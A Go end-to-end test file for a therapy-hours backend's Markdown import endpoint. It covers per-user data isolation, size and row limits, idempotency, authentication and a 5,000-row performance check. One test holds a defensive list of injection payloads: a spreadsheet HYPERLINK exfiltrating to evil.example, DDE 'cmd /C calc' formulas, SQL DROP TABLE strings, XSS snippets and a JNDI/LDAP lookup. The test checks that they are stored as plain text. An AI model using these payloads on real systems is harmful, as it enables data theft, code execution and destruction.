package importexport_test

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/aws/aws-lambda-go/events"

	"github.com/malcolmjefferson/therapy_service_hours_backend/internal/apigw"
	"github.com/malcolmjefferson/therapy_service_hours_backend/internal/db"
	"github.com/malcolmjefferson/therapy_service_hours_backend/internal/domain"
	httpapi "github.com/malcolmjefferson/therapy_service_hours_backend/internal/http"
	"github.com/malcolmjefferson/therapy_service_hours_backend/internal/service/categories"
	"github.com/malcolmjefferson/therapy_service_hours_backend/internal/service/clients"
	"github.com/malcolmjefferson/therapy_service_hours_backend/internal/service/entries"
	"github.com/malcolmjefferson/therapy_service_hours_backend/internal/service/importexport"
)

// S4-04 end-to-end tests: POST /import/markdown through the real router (body limit, Idempotency-Key,
// multipart binding), the import service and the PostgreSQL store, against the real migrations
// (GO-17, GO-72). Users, clients and notes are fictional pseudonyms (CLAUDE.md §0.7).

// api is the production wiring over one migrated database, called the way API Gateway calls the Lambda.
type api struct {
	t      *testing.T
	e      *env
	router http.Handler
	actors sync.Map // subject -> domain.Actor
	keys   atomic.Int64
}

func newAPI(t *testing.T) *api {
	t.Helper()
	e := newEnv(t)
	a := &api{t: t, e: e}
	entryService, err := entries.New(db.NewEntryStore(e.pool))
	if err != nil {
		t.Fatal(err)
	}
	clientService, err := clients.New(db.NewClientStore(e.pool))
	if err != nil {
		t.Fatal(err)
	}
	categoryService, err := categories.New(db.NewCategoryStore(e.pool))
	if err != nil {
		t.Fatal(err)
	}
	a.router, err = httpapi.NewRouter(httpapi.RouterDeps{
		Logger:       slog.New(slog.NewJSONHandler(io.Discard, nil)),
		Version:      "test",
		MaxBodyBytes: 1 << 20,
		NewRequestID: func() string { return "request-id" },
		Now:          time.Now,
		ActorResolver: actorResolver(func(_ context.Context, claims map[string]string) (domain.Actor, error) {
			if actor, ok := a.actors.Load(claims["sub"]); ok {
				return actor.(domain.Actor), nil
			}
			return domain.Actor{}, domain.ErrForbidden
		}),
		Entries:     entryService,
		Clients:     clientService,
		Categories:  categoryService,
		Imports:     e.service,
		Idempotency: db.NewIdempotencyStore(e.pool),
	})
	if err != nil {
		t.Fatal(err)
	}
	return a
}

type actorResolver func(context.Context, map[string]string) (domain.Actor, error)

func (f actorResolver) Resolve(ctx context.Context, claims map[string]string) (domain.Actor, error) {
	return f(ctx, claims)
}

// as registers actor as the user behind subject "sub-<id>" and returns that subject.
func (a *api) as(actor domain.Actor) string {
	sub := "sub-" + actor.ID
	a.actors.Store(sub, actor)
	return sub
}

type response struct {
	status  int
	headers map[string]string
	body    string
}

func (a *api) call(event events.APIGatewayV2HTTPRequest, sub string) response {
	a.t.Helper()
	event.RequestContext.Authorizer = &events.APIGatewayV2HTTPRequestContextAuthorizerDescription{JWT: &events.APIGatewayV2HTTPRequestContextAuthorizerJWTDescription{Claims: map[string]string{"sub": sub}}}
	res, err := apigw.Handler(a.router, httpapi.ContextWithRequestID)(a.t.Context(), event)
	if err != nil {
		a.t.Fatal(err)
	}
	return response{status: res.StatusCode, headers: res.Headers, body: res.Body}
}

// upload is one POST /import/markdown.
type upload struct {
	sub         string
	key         string // Idempotency-Key; a fresh one when empty
	contentType string // of the file part; text/markdown when empty
	boundary    string
	content     []byte
}

func (a *api) post(u upload) response {
	a.t.Helper()
	if u.key == "" {
		u.key = fmt.Sprintf("00000000-0000-4000-8000-%012d", a.keys.Add(1))
	}
	if u.contentType == "" {
		u.contentType = "text/markdown"
	}
	if u.boundary == "" {
		u.boundary = "boundary-" + u.key
	}
	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	_ = w.SetBoundary(u.boundary)
	h := textproto.MIMEHeader{}
	h.Set("Content-Disposition", `form-data; name="file"; filename="ledger.md"`)
	h.Set("Content-Type", u.contentType)
	part, err := w.CreatePart(h)
	if err != nil {
		a.t.Fatal(err)
	}
	_, _ = part.Write(u.content)
	_ = w.Close()
	event := events.APIGatewayV2HTTPRequest{
		RawPath: httpapi.BasePath + "/import/markdown", Body: base64.StdEncoding.EncodeToString(body.Bytes()), IsBase64Encoded: true,
		Headers: map[string]string{"content-type": w.FormDataContentType(), "idempotency-key": u.key},
	}
	event.RequestContext.HTTP.Method = http.MethodPost
	return a.call(event, u.sub)
}

func (a *api) get(sub, path, query string) response {
	a.t.Helper()
	event := events.APIGatewayV2HTTPRequest{RawPath: httpapi.BasePath + path, RawQueryString: query}
	event.RequestContext.HTTP.Method = http.MethodGet
	return a.call(event, sub)
}

type reportBody struct {
	TotalRows      int `json:"total_rows"`
	ImportedCount  int `json:"imported_count"`
	NeedsTimeCount int `json:"needs_time_count"`
	SkippedCount   int `json:"skipped_count"`
	MergedClients  []struct {
		Client  struct{ ID, Name string }
		Created bool
	} `json:"merged_clients"`
	SkippedRows []struct {
		Row    int    `json:"row"`
		Reason string `json:"reason"`
	} `json:"skipped_rows"`
}

func decodeReport(t *testing.T, res response) reportBody {
	t.Helper()
	if res.status != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %.300s)", res.status, res.body)
	}
	var r reportBody
	if err := json.Unmarshal([]byte(res.body), &r); err != nil {
		t.Fatalf("decode report: %v", err)
	}
	return r
}

func wantProblem(t *testing.T, res response, status int, problemType string) {
	t.Helper()
	var p struct{ Type string }
	if err := json.Unmarshal([]byte(res.body), &p); err != nil || res.status != status || p.Type != "urn:therapy-service-hours:problem:"+problemType {
		t.Fatalf("response = %d %.300s, want %d %s", res.status, res.body, status, problemType)
	}
}

// ledgerOf builds a ledger with the Start and End columns and n untimed rows, one session each.
func ledgerOf(n int) string {
	var b strings.Builder
	b.WriteString("# Clinical Hours Ledger\n\n## Entries\n| Date | Group | Category | Client | Start | End | Hours | On-site | Notes |\n|---|---|---|---|---|---|---|---|---|\n")
	base := time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC)
	for i := 0; i < n; i++ {
		d := base.AddDate(0, 0, i/4).Format(time.DateOnly)
		start, end := "", ""
		if i%2 == 0 { // Half of the rows have times, in separate slots of the day.
			start, end = fmt.Sprintf("%02d:00", 8+(i%4)*2), fmt.Sprintf("%02d:00", 9+(i%4)*2)
		}
		fmt.Fprintf(&b, "| %s | Direct Service | Individual Counseling | Pseudonym %c; Pseudonym %c | %s | %s | 1 | Yes | Session note number %d with some typical length of text |\n",
			d, 'A'+i%20, 'A'+(i+7)%20, start, end, i)
	}
	return b.String()
}

func TestEndpoint_ImportsThePrototypeLedgerAsTheCallersOwnData(t *testing.T) {
	a := newAPI(t)
	me := a.e.user("trainee@example.test")
	sub := a.as(me)
	data, err := os.ReadFile("testdata/prototype_no_times.md")
	if err != nil {
		t.Fatal(err)
	}

	report := decodeReport(t, a.post(upload{sub: sub, content: data}))

	if report.ImportedCount == 0 || report.NeedsTimeCount != report.ImportedCount || report.TotalRows != report.ImportedCount+report.SkippedCount {
		t.Fatalf("report = %+v", report)
	}
	if got := a.e.entryCount(me); got != report.ImportedCount {
		t.Errorf("%d entries stored, report says %d", got, report.ImportedCount)
	}
	// The user sees them through the export endpoint, flagged as needing a time.
	res := a.get(sub, "/export/entries", "page_size=200")
	var page struct {
		Items []struct {
			NeedsTime bool `json:"needs_time"`
		}
		Page struct {
			TotalItems int `json:"total_items"`
		}
	}
	if err := json.Unmarshal([]byte(res.body), &page); err != nil || res.status != http.StatusOK {
		t.Fatalf("export = %d %.200s (%v)", res.status, res.body, err)
	}
	if page.Page.TotalItems != report.ImportedCount {
		t.Errorf("export has %d entries, want %d", page.Page.TotalItems, report.ImportedCount)
	}
	for _, it := range page.Items {
		if !it.NeedsTime {
			t.Error("an imported legacy entry is not flagged needs_time")
		}
	}
}

// Everything is stored for the caller; the same file imported by another user, even an admin, is
// that user's own data and is never a duplicate of someone else's.
func TestEndpoint_ImportsOnlyIntoTheCallersOwnLedger(t *testing.T) {
	a := newAPI(t)
	alice := a.e.user("alice@example.test")
	bob := a.e.user("bob@example.test")
	// An admin has no wider reach: the import is still only into the admin's own ledger.
	bob.Admin, bob.Supervisor = true, true
	data, _ := os.ReadFile("testdata/prototype_no_times.md")

	first := decodeReport(t, a.post(upload{sub: a.as(alice), content: data}))
	second := decodeReport(t, a.post(upload{sub: a.as(bob), content: data}))

	if second.ImportedCount != first.ImportedCount || second.SkippedCount != first.SkippedCount {
		t.Errorf("bob's import = %+v, want the same as alice's %+v", second, first)
	}
	if a.e.entryCount(alice) != first.ImportedCount || a.e.entryCount(bob) != second.ImportedCount {
		t.Errorf("entries: alice %d, bob %d", a.e.entryCount(alice), a.e.entryCount(bob))
	}
	if n := a.e.count(`SELECT count(*) FROM entries WHERE user_id NOT IN ($1, $2)`, alice.ID, bob.ID); n != 0 {
		t.Errorf("%d entries belong to neither user", n)
	}
	// Alice's clients are hers: Bob's import created his own, not links to Alice's.
	if n := a.e.count(`SELECT count(*) FROM entry_clients ec JOIN clients c ON c.id = ec.client_id WHERE ec.user_id <> c.user_id`); n != 0 {
		t.Errorf("%d entry-client links cross users", n)
	}
	// A user the API does not know is refused and nothing is stored.
	unknown := a.post(upload{sub: "unknown-subject", content: data})
	wantProblem(t, unknown, http.StatusForbidden, "forbidden")
}

func TestEndpoint_InjectionLikeCellsAreStoredAsPlainText(t *testing.T) {
	a := newAPI(t)
	me := a.e.user("trainee@example.test")
	sub := a.as(me)
	payloads := []string{
		`=HYPERLINK("http://evil.example/?x="&A1,"click")`,
		`+1+1`,
		`-2+3`,
		`@SUM(1+1)*cmd|' /C calc'!A0`,
		`'; DROP TABLE entries; --`,
		`" OR 1=1 --`,
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`[x](javascript:alert(1))`,
		`$1 %s %_ \ \\ ${jndi:ldap://evil.example/a}`,
	}
	var b strings.Builder
	b.WriteString("# Clinical Hours Ledger\n\n## Clients / Groups\n- =cmd|' /C calc'!A0\n- '; DROP TABLE clients; --\n\n## Entries\n| Date | Group | Category | Client | Hours | On-site | Notes |\n|---|---|---|---|---|---|---|\n")
	for i, p := range payloads {
		fmt.Fprintf(&b, "| 2026-03-%02d | Direct Service | Individual Counseling | =cmd\\|' /C calc'!A0 | 1 | No | %s |\n", i+1, strings.ReplaceAll(p, "|", `\|`))
	}

	report := decodeReport(t, a.post(upload{sub: sub, content: []byte(b.String())}))

	if report.ImportedCount != len(payloads) {
		t.Fatalf("report = %+v, want every row imported", report)
	}
	for i, want := range payloads {
		var got string
		err := a.e.conn.QueryRow(t.Context(), `SELECT notes FROM entries WHERE user_id = $1 AND session_date = $2::date`, me.ID, fmt.Sprintf("2026-03-%02d", i+1)).Scan(&got)
		if err != nil {
			t.Fatalf("read note %d: %v", i, err)
		}
		if got != want {
			t.Errorf("note %d = %q, want it stored exactly as %q", i, got, want)
		}
	}
	var name string
	if err := a.e.conn.QueryRow(t.Context(), `SELECT name FROM clients WHERE user_id = $1 AND name LIKE '=cmd%'`, me.ID).Scan(&name); err != nil || name != `=cmd|' /C calc'!A0` {
		t.Errorf("client name = %q (%v), want it stored exactly", name, err)
	}
	// The tables the payloads name are still there, and the API returns the text as JSON strings.
	if a.e.count(`SELECT count(*) FROM entries WHERE user_id = $1`, me.ID) != len(payloads) || a.e.count(`SELECT count(*) FROM clients WHERE user_id = $1`, me.ID) != 2 {
		t.Error("an injection payload changed what was stored")
	}
	res := a.get(sub, "/export/entries", "page_size=200")
	escaped, _ := json.Marshal("<script>alert(1)</script>") // The JSON encoder escapes markup characters.
	if res.status != http.StatusOK || strings.Contains(res.body, "<script>") || !strings.Contains(res.body, string(escaped)) {
		t.Errorf("export = %d; markup must come back as an escaped JSON string: %s", res.status, res.body)
	}
}

func TestEndpoint_RejectsWhatIsNotAMarkdownLedgerWithoutStoringAnything(t *testing.T) {
	a := newAPI(t)
	me := a.e.user("trainee@example.test")
	sub := a.as(me)
	png := append([]byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n', 0, 0, 0, 13}, bytes.Repeat([]byte{0xff, 0xfe}, 64)...)
	tests := []struct {
		name        string
		contentType string
		content     []byte
	}{
		{"an image sent as an image", "image/png", png},
		{"an image that claims to be Markdown", "text/markdown", png},
		{"text that is not a ledger", "text/plain", []byte("Dear diary, today I counted hours.\n")},
		{"JSON", "application/json", []byte(`{"entries":[]}`)},
		{"an empty file", "text/markdown", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := a.post(upload{sub: sub, contentType: tt.contentType, content: tt.content})
			wantProblem(t, res, http.StatusBadRequest, "validation")
			if strings.Contains(res.body, "diary") {
				t.Errorf("the problem echoes the upload: %s", res.body)
			}
		})
	}
	if n := a.e.entryCount(me) + a.e.clientCount(me); n != 0 {
		t.Errorf("%d rows stored from refused uploads", n)
	}
}

func TestEndpoint_EnforcesTheSizeAndRowLimits(t *testing.T) {
	a := newAPI(t)
	me := a.e.user("trainee@example.test")
	sub := a.as(me)

	t.Run("a file over 1 MiB is 413 body-too-large", func(t *testing.T) {
		big := ledgerOf(10) + strings.Repeat("padding line that makes the file too big\n", 30000)
		if len(big) <= 1<<20 {
			t.Fatalf("test file is %d bytes", len(big))
		}
		wantProblem(t, a.post(upload{sub: sub, content: []byte(big)}), http.StatusRequestEntityTooLarge, "body-too-large")
	})
	t.Run("a file of exactly 1 MiB is read, and refused only for what it holds", func(t *testing.T) {
		exact := ledgerOf(10)
		exact += strings.Repeat("x", 1<<20-len(exact))
		res := a.post(upload{sub: sub, content: []byte(exact)})
		if res.status == http.StatusRequestEntityTooLarge {
			t.Fatalf("a file of exactly 1 MiB was refused as too large: %.200s", res.body)
		}
	})
	t.Run("5001 rows is 413 import-too-many-rows", func(t *testing.T) {
		wantProblem(t, a.post(upload{sub: sub, content: []byte(ledgerOf(importexport.MaxRows + 1))}), http.StatusRequestEntityTooLarge, "import-too-many-rows")
	})
	if n := a.e.entryCount(me); n > 10 {
		t.Errorf("%d entries stored by over-limit uploads, want none beyond the 10 of the exact-size file", n)
	}
}

// The largest allowed import finishes far inside the API Lambda's 15-second timeout: the inserts go
// out in two statements, not one round trip per row (S4-04, checked for the S4-03 status note).
func TestEndpoint_ImportsFiveThousandRowsQuickly(t *testing.T) {
	a := newAPI(t)
	me := a.e.user("trainee@example.test")
	sub := a.as(me)
	file := []byte(ledgerOf(importexport.MaxRows))
	if len(file) > 1<<20 {
		t.Fatalf("5,000-row test file is %d bytes, over the limit", len(file))
	}

	start := time.Now()
	report := decodeReport(t, a.post(upload{sub: sub, content: file}))
	elapsed := time.Since(start)

	if report.ImportedCount != importexport.MaxRows || report.SkippedCount != 0 {
		t.Fatalf("report = %d imported, %d skipped", report.ImportedCount, report.SkippedCount)
	}
	if a.e.entryCount(me) != importexport.MaxRows {
		t.Errorf("%d entries stored", a.e.entryCount(me))
	}
	if n := a.e.count(`SELECT count(*) FROM entry_clients WHERE user_id = $1`, me.ID); n != 2*importexport.MaxRows {
		t.Errorf("%d client links stored, want %d", n, 2*importexport.MaxRows)
	}
	t.Logf("5,000 rows imported in %v", elapsed)
	if elapsed > 8*time.Second {
		t.Errorf("import took %v; the API Lambda times out at 15 s", elapsed)
	}
	// And the whole file again is five thousand duplicates.
	again := decodeReport(t, a.post(upload{sub: sub, content: file}))
	if again.ImportedCount != 0 || again.SkippedCount != importexport.MaxRows {
		t.Errorf("re-import = %d imported, %d skipped", again.ImportedCount, again.SkippedCount)
	}
}

func TestEndpoint_ARetryWithTheSameKeyReplaysTheReportAndImportsOnce(t *testing.T) {
	a := newAPI(t)
	me := a.e.user("trainee@example.test")
	sub := a.as(me)
	data, _ := os.ReadFile("testdata/prototype_no_times.md")
	const key = "00000000-0000-4000-8000-0000000000aa"

	first := a.post(upload{sub: sub, key: key, boundary: "one", content: data})
	stored := a.e.entryCount(me)
	second := a.post(upload{sub: sub, key: key, boundary: "two", content: data})

	if first.status != http.StatusOK || second.status != http.StatusOK || second.body != first.body {
		t.Fatalf("statuses %d, %d; bodies equal: %v", first.status, second.status, second.body == first.body)
	}
	if second.headers["Idempotency-Replayed"] != "true" {
		t.Errorf("Idempotency-Replayed = %q, want true", second.headers["Idempotency-Replayed"])
	}
	if a.e.entryCount(me) != stored {
		t.Errorf("the retry changed the entry count from %d to %d", stored, a.e.entryCount(me))
	}
	// A different file under the same key is refused, not imported.
	other := a.post(upload{sub: sub, key: key, content: []byte(ledgerOf(3))})
	wantProblem(t, other, http.StatusConflict, "idempotency-key-reused")
	if a.e.entryCount(me) != stored {
		t.Error("a reused key imported another file")
	}
	// The same file under a new key is a new request: every row is a duplicate.
	again := decodeReport(t, a.post(upload{sub: sub, content: data}))
	if again.ImportedCount != 0 || again.SkippedCount != again.TotalRows {
		t.Errorf("new key, same file = %+v, want everything skipped as duplicate", again)
	}
}

func TestEndpoint_RequiresSignInAndAKey(t *testing.T) {
	a := newAPI(t)
	me := a.e.user("trainee@example.test")
	sub := a.as(me)
	event := events.APIGatewayV2HTTPRequest{RawPath: httpapi.BasePath + "/import/markdown", Body: "x", Headers: map[string]string{"content-type": "multipart/form-data; boundary=x", "idempotency-key": "00000000-0000-4000-8000-0000000000bb"}}
	event.RequestContext.HTTP.Method = http.MethodPost
	// No authorizer claims at all.
	res, err := apigw.Handler(a.router, httpapi.ContextWithRequestID)(t.Context(), event)
	if err != nil || res.StatusCode != http.StatusUnauthorized {
		t.Fatalf("unauthenticated = %d (%v), want 401", res.StatusCode, err)
	}
	// Signed in, no Idempotency-Key.
	delete(event.Headers, "idempotency-key")
	res2 := a.call(event, sub)
	if res2.status != http.StatusBadRequest {
		t.Fatalf("no key = %d %.200s, want 400", res2.status, res2.body)
	}
	if a.e.entryCount(me) != 0 {
		t.Error("a refused request stored entries")
	}
}
